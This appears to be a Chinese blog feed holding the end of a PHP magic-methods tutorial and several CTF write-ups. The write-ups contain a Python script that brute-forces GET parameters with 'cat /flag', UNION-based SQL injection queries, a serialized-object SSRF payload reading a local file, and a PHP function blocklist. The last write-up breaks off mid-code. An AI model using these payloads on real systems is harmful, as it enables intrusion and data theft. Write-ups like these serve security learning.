class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到了吗？不用100个，只是3个看起来就有点烦了。而且这样就会有一个问题：如果脚本执行“条件B”这个分支时，C.php这个文件其实没有必要包含。因为，任何一个被包含的文件，无论是否使用，均会被php引擎编译。如果不使用，却被编译，这样可以被视作一种资源浪费。更进一步，如果C.php包含了D.php，D.php包含了E.php。并且大部分情况都执行“条件B”分支，那么就会浪费一部分资源去编译C.php,D.php,E.php三个“无用”的文件。</p><p>那么如果使用 <code>__autoload()</code> 方式呢？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment"> * 文件autoload_demo.php </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">__autoload</span>(<span class="params"><span class="variable">$className</span></span>) </span>&#123;  </span><br><span class="line">    <span class="variable">$filePath</span> = “project/<span class="class"><span class="keyword">class</span>/</span>&#123;<span class="variable">$className</span>&#125;.php”;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_readable</span>(<span class="variable">$filePath</span>)) &#123;  </span><br><span class="line">        <span class="keyword">require</span>(<span class="variable">$filePath</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">   </span><br><span class="line"><span class="keyword">if</span> (条件A) &#123;  </span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();  </span><br><span class="line">    <span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();  </span><br><span class="line">    <span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>();  </span><br><span class="line">    <span class="comment">// … 业务逻辑  </span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (条件B) &#123;  </span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">newA</span>();  </span><br><span class="line">    <span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();  </span><br><span class="line">    <span class="comment">// … 业务逻辑  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ok,不论效率怎么用，最起码界面看起来舒服多了，没有太多冗余的代。</p><p>再来看看这里的效率如何，我们分析下：</p><p>当php引擎第一次使用类A，但是找不到时，会自动调用 <code>__autoload</code> 方法，并将类名“A”作为参数传入。所以，我们在 <code>__autoload()</code> 中需要的做的就是根据类名，找到相应的文件，并包含进来，如果我们的方法也找不到，那么php引擎就会报错了。</p><p>注意：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里可以只用require，因为一旦包含进来后，php引擎再遇到类<span class="selector-tag">A</span>时，将不会调用__autoload，而是直接使用内存中的类<span class="selector-tag">A</span>，不会导致多次包含。</span><br></pre></td></tr></table></figure><p>扩展：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">其实php发展到今天，已经有将 <span class="string">`spl_autoload_register`</span> — 注册给定的函数作为 __autoload 的实现了，但是这个不在啊本文讲解之内，有兴趣可以自行看手册。</span><br></pre></td></tr></table></figure><h3 id="十六、-debugInfo-，打印所需调试信息"><a href="#十六、-debugInfo-，打印所需调试信息" class="headerlink" title="十六、__debugInfo()，打印所需调试信息"></a>十六、__debugInfo()，打印所需调试信息</h3><p>注意：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">该方法在PHP 5.6.0及其以上版本才可以用，如果你发现使用无效或者报错，请查看啊你的版本。</span><br></pre></td></tr></table></figure><p>看代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$prop</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$val</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;prop = <span class="variable">$val</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__debugInfo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [</span><br><span class="line">            <span class="string">&#x27;propSquared&#x27;</span> =&gt; <span class="variable language_">$this</span>-&gt;prop ** <span class="number">2</span>,</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="keyword">new</span> <span class="title function_ invoke__">C</span>(<span class="number">42</span>));</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object(C)#1 (1) &#123; [&quot;propSquared&quot;]=&gt; int(1764) &#125;</span><br></pre></td></tr></table></figure><p>再次注意：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里的 <span class="string">`**`</span> 是乘方的意思，也是在<span class="title class_">PHP5</span><span class="number">.6</span><span class="number">.0</span>及其以上才可以使用，详情请查看<span class="variable constant_">PHP</span>手册</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;PHP魔术方法&lt;/p&gt;</summary>
    
    
    
    <category term="php反序列化" scheme="https://flypigc.github.io/categories/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
    <category term="web安全" scheme="https://flypigc.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://flypigc.github.io/2025/12/11/%E5%BC%BA%E7%BD%91%E6%9D%AF2019--%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/"/>
    <id>https://flypigc.github.io/2025/12/11/%E5%BC%BA%E7%BD%91%E6%9D%AF2019--%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/</id>
    <published>2025-12-11T07:00:27.568Z</published>
    <updated>2025-12-11T07:14:03.986Z</updated>
    
    <content type="html"><![CDATA[<h1 id="强网杯2019–高明的黑客"><a href="#强网杯2019–高明的黑客" class="headerlink" title="强网杯2019–高明的黑客"></a>强网杯2019–高明的黑客</h1><span id="more"></span><p>拿到很多奇怪的东西，跑脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://7f163133-d226-4d67-bffa-9c2366d4eab3.node5.buuoj.cn:81/&#x27;</span></span><br><span class="line">path = <span class="string">r&#x27;C:\Users\11759\Downloads\Compressed\sss&#x27;</span></span><br><span class="line"></span><br><span class="line">ptn_get = re.<span class="built_in">compile</span>(<span class="string">br&quot;\$_GET\[&#x27;(\w+)&#x27;\]&quot;</span>)  <span class="comment">#匹配文件里面的GET内容</span></span><br><span class="line"></span><br><span class="line">flag_ptn = re.<span class="built_in">compile</span>(<span class="string">br&quot;\&#123;.*?\&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;========== 开始扫描 ==========\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> os.scandir(path):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> f.is_file() <span class="keyword">or</span> <span class="keyword">not</span> f.name.endswith(<span class="string">&quot;.php&quot;</span>):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 扫描文件：<span class="subst">&#123;f.name&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(f.path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        content = fp.read()</span><br><span class="line"></span><br><span class="line">    params = <span class="built_in">set</span>(ptn_get.findall(content))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> params:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> params:</span><br><span class="line">        p = p.decode()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;    [+] 测试参数：<span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(</span><br><span class="line">                url + f.name,</span><br><span class="line">                params=&#123;p: <span class="string">&quot;cat /flag&quot;</span>&#125;,</span><br><span class="line">                timeout=<span class="number">8</span></span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> flag_ptn.search(r.content):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n漏洞发现！&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;文件：<span class="subst">&#123;f.name&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;参数：<span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;PoC：<span class="subst">&#123;url&#125;</span><span class="subst">&#123;f.name&#125;</span>?<span class="subst">&#123;p&#125;</span>=cat /flag&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\nflag:&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n========== 扫描结束：未发现命令执行 ==========&quot;</span>)</span><br><span class="line">直接获取payload如下</span><br><span class="line">/xk0SzyKwfzw.php?Efa5BVG=cat /flag</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;强网杯2019–高明的黑客&quot;&gt;&lt;a href=&quot;#强网杯2019–高明的黑客&quot; class=&quot;headerlink&quot; title=&quot;强网杯2019–高明的黑客&quot;&gt;&lt;/a&gt;强网杯2019–高明的黑客&lt;/h1&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://flypigc.github.io/2025/12/11/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018--Fakebook/"/>
    <id>https://flypigc.github.io/2025/12/11/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018--Fakebook/</id>
    <published>2025-12-11T06:56:32.526Z</published>
    <updated>2025-12-11T06:57:00.954Z</updated>
    
    <content type="html"><![CDATA[<h1 id="网鼎杯-2018–Fakebook"><a href="#网鼎杯-2018–Fakebook" class="headerlink" title="网鼎杯 2018–Fakebook"></a>网鼎杯 2018–Fakebook</h1><span id="more"></span><p>扫到目录robots.txt<br><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765435759511-255a8978-c3bf-4df5-b228-493691498b04.png" alt="null"></p><p>访问&#x2F;user.php.bak</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="variable language_">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里看到view.php路径<br><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765435759593-c0acfa86-066d-4f18-9ed7-2e76c9cc5bfe.png" alt="null"></p><p>然后可以大致判断flag应该在</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/flag.php</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765435759668-d6d3b1a6-3820-46f6-afcb-9ef72873c42f.png" alt="null"></p><p>这里发现sql注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no=1 and 1=1</span><br></pre></td></tr></table></figure><p>判断列数<br>4列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no=1 order by 4--+</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765435759731-fd4e302c-ce51-414c-a475-0292b86cc92b.png" alt="null"></p><p>回显位为2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no=-1 union/**/select 1,2,3,4--+</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765435759831-e50bb2a2-7032-44c8-8955-a5e1f31fee2e.png" alt="null"><br>查数据库为fakebook</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no=-1 union/**/select 1,group_concat(schema_name),3,4 from information_schema.schemata--+</span><br></pre></td></tr></table></figure><p>得到以下数据库</p><p>fakebook,information_schema,mysql,performance_schema,test</p><p>爆表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&quot;fakebook&quot;--+</span><br></pre></td></tr></table></figure><p>得到表名users</p><p>爆字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&quot;users&quot;--+</span><br></pre></td></tr></table></figure><p>得到字段是<br>no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</p><p>最后查数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no=-1 union/**/select 1,concat(no,&quot;\n&quot;,username,&quot;\n&quot;,passwd,&quot;\n&quot;,data),3,4 from users--+</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765435759898-39246b65-06c1-482b-afad-07c5f6fb79aa.png" alt="null"></p><p>得到如下数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 admin c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:8:&quot;123.blog&quot;;&#125;</span><br></pre></td></tr></table></figure><p>data字段为我们刚join注册的数据序列化的形式</p><p>注意到源代码是iframe格式<br>前面的分析可知flag.php的路径，ssrf可以伪协议file:&#x2F;&#x2F;,把序列化字符串作为参数输入测试，将blog值改为百度的网址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no=-1 union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:22:&quot;https://www.baidu.com/&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure><p>这里我没成功，暂时不知道什么原因</p><p>这边由于原本的<code>https://www.baodu.com/</code>是22，所以构造payload时这边改成<code>file:///var/www/html/flag.php</code>要更改长度为29</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no=-1 union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765435759963-eaf52d6a-bb23-4160-946d-34e6a1859f2c.png" alt="null"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765435760070-175a2513-0ff4-4b76-baf5-0f2d1f181343.png" alt="null"></p><p>解码得到flag</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;网鼎杯-2018–Fakebook&quot;&gt;&lt;a href=&quot;#网鼎杯-2018–Fakebook&quot; class=&quot;headerlink&quot; title=&quot;网鼎杯 2018–Fakebook&quot;&gt;&lt;/a&gt;网鼎杯 2018–Fakebook&lt;/h1&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://flypigc.github.io/2025/12/11/%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84--phpweb/"/>
    <id>https://flypigc.github.io/2025/12/11/%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84--phpweb/</id>
    <published>2025-12-11T06:54:49.706Z</published>
    <updated>2025-12-11T06:55:18.265Z</updated>
    
    <content type="html"><![CDATA[<h1 id="网鼎杯-2020-朱雀组–phpweb"><a href="#网鼎杯-2020-朱雀组–phpweb" class="headerlink" title="网鼎杯 2020 朱雀组–phpweb"></a>网鼎杯 2020 朱雀组–phpweb</h1><span id="more"></span><p>这个先放御剑扫一下，没出货<br>然后观察到它是一直刷新的，我们用bp抓一下包<br><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765435761524-6f0ea0b3-e007-4051-bab0-5ca2a2f259bc.png" alt="null"></p><p>这里看到请求传了一个func和p<br><code>func</code>猜测是<code>function</code>,<code>p</code>应该是<code>payload</code>（猜的）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=file_get_contents&amp;p=index.php</span><br></pre></td></tr></table></figure><p>传过去得到如下代码<br><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765435761610-cd45ab1a-fe5c-4f78-b66c-766100510ab2.png" alt="null"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        <span class="variable">$a</span>= <span class="title function_ invoke__">gettype</span>(<span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$this</span>-&gt;func, <span class="variable">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line">    <span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ 